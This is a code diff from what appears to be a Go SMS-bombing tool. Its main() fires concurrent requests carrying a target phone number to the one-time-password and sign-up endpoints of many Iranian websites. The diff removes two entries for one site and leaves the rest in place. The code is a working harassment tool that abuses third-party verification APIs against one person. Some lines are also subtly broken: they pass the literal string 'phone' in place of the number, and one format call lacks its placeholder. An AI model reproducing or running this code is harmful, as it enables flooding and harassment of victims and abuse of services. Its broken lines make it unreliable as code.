@@ -271,9 +271,6 @@ func main() {
 		go sms("https://api.lendo.ir/api/customer/auth/send-otp", map[string]interface{}{
 			"mobile": phone,
 		}, ch)    // add site
-		go sms("https://api.torob.com/v4/user/phone/send-pin", map[string]interface{}{
-			"phone_number": phone,
-		}, ch) // dar khate 129 va 593 neveshteh shodeh.
 		go sms("https://drdr.ir/api/registerEnrollment/verifyMobile", map[string]interface{}{
 			"phoneNumber": phone,
 		}, ch) // dar khate 228 neveshteh shodeh.
@@ -544,9 +541,6 @@ func main() {
 		}, ch)  // edit :4/22/2025
 		go sms("https://www.chamedoun.com/auth/sms/send-login-otp", map[string]interface{}{
 			"phone": "phone",
-		}, ch)  // edit :4/22/2025
-		go sms(fmt.Sprintf("https://api.torob.com/v4/user/phone/send-pin/?phone_number=", phone), map[string]interface{}{
-			"phone_number": "phone",
 		}, ch)  // edit :4/22/2025
 		go sms("https://www.namava.ir/api/v1.0/accounts/registrations/by-otp/request", map[string]interface{}{
 			"UserName": "phone",
